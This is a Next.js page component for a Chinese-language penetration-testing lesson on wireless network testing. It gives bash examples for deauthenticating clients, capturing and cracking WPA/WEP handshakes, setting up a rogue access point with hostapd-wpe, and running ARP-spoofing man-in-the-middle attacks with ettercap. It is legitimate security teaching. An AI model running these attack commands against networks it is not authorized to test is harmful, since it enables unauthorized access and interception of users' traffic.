'use client'

import LessonLayout, { type LessonMeta } from '@/app/components/ui/book/LessonLayout'
import { THEMES } from '@/app/components/ui/book/theme'
import {
  PageTitle, SectionTitle, BookParagraph, BookCode, BookAlert, BookList, TagGrid,
} from '@/app/components/ui/book/BookContent'

const META: LessonMeta = {
  subject: '网络安全', chapterTitle: '无线网络测试', chapterNumber: 8,
  totalChapters: 10, subjectHref: '/study/security/penetration',
  prevChapter: { label: '移动应用测试', href: '/study/security/penetration/mobile' },
  nextChapter: { label: '社会工程学', href: '/study/security/penetration/social' },
  theme: THEMES.security,
}

const SPREADS = [
  {
    label: '基础概念',
    left: (
      <div className="space-y-4">
        <PageTitle>无线网络测试基础概念</PageTitle>
        <BookParagraph>无线网络测试是针对Wi-Fi、蓝牙等无线通信协议和设备进行安全性评估，发现无线环境中的加密、认证、隔离、信号覆盖等安全隐患。测试内容涵盖AP配置、加密协议、客户端安全、钓鱼攻击等多个层面。</BookParagraph>
        <BookList items={['目标：发现无线网络中的安全漏洞，防止未授权接入和数据泄露', '范围：AP、客户端、无线协议、信号覆盖、隔离策略等', '方法：信号嗅探+协议分析+攻击模拟+手工测试']} />
        <BookCode language="bash" code={`# 无线网卡监听模式
ifconfig wlan0 down
airmon-ng start wlan0

# 捕获握手包
airodump-ng wlan0mon -w handshake --write-interval 1

# 断开客户端
aireplay-ng -0 5 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon`} />
      </div>
    ),
    right: (
      <div className="space-y-4">
        <PageTitle>测试流程</PageTitle>
        <BookList items={['环境准备：无线网卡、驱动、测试平台、信号分析工具', '信号嗅探：扫描AP、客户端、信道、信号强度', '协议分析：识别加密类型、认证方式、隔离策略', '攻击模拟：钓鱼AP、握手包捕获、暴力破解、拒绝服务', '漏洞验证：手动复现和确认无线漏洞', '报告编写：整理漏洞细节和修复建议']} />
        <BookCode language="bash" code={`# 扫描AP和客户端
airodump-ng wlan0mon

# 钓鱼AP搭建
hostapd-wpe hostapd-wpe.conf

# WPA握手包破解
aircrack-ng -w rockyou.txt -b <AP_MAC> handshake.cap`} />
      </div>
    ),
  },
  {
    label: '常见漏洞',
    left: (
      <div className="space-y-4">
        <PageTitle>常见无线网络漏洞类型</PageTitle>
        <BookList items={['弱加密协议：WEP、WPA等易被破解的加密方式', '钓鱼AP：伪造合法AP诱骗用户连接', '中间人攻击：劫持通信流量，窃取敏感信息', '拒绝服务：断开客户端、信号干扰、AP泛洪', '客户端漏洞：驱动、配置、认证缺陷', '隔离策略缺失：客户端间可互访、内网暴露']} />
      </div>
    ),
    right: (
      <div className="space-y-4">
        <PageTitle>漏洞利用代码示例</PageTitle>
        <BookCode language="bash" code={`# WEP破解
aircrack-ng -b <AP_MAC> -w rockyou.txt capture.cap

# 钓鱼AP搭建
hostapd-wpe hostapd-wpe.conf

# 中间人攻击
ettercap -T -q -i wlan0 -M arp:remote /<target_ip>/ /<gateway_ip>/`} />
      </div>
    ),
  },
  {
    label: '工具实践',
    left: (
      <div className="space-y-4">
        <PageTitle>无线安全测试工具</PageTitle>
        <BookList items={['aircrack-ng：无线抓包、破解、注入全能套件', 'hostapd-wpe：钓鱼AP搭建与认证信息捕获', 'Wireshark：无线协议分析与流量抓取', 'ettercap：中间人攻击与ARP欺骗', 'kismet：无线信号嗅探与设备发现', 'Wifite：自动化无线攻击工具']} />
      </div>
    ),
    right: (
      <div className="space-y-4">
        <PageTitle>工具实践示例</PageTitle>
        <BookCode language="bash" code={`# aircrack-ng破解WPA
aircrack-ng -w rockyou.txt -b <AP_MAC> handshake.cap

# Wireshark抓包分析
wireshark &

# Wifite自动化攻击
wifite --kill --timeout 30`} />
      </div>
    ),
  },
]

export default function PenetrationWirelessPage() {
  return <LessonLayout meta={META} spreads={SPREADS} />
}
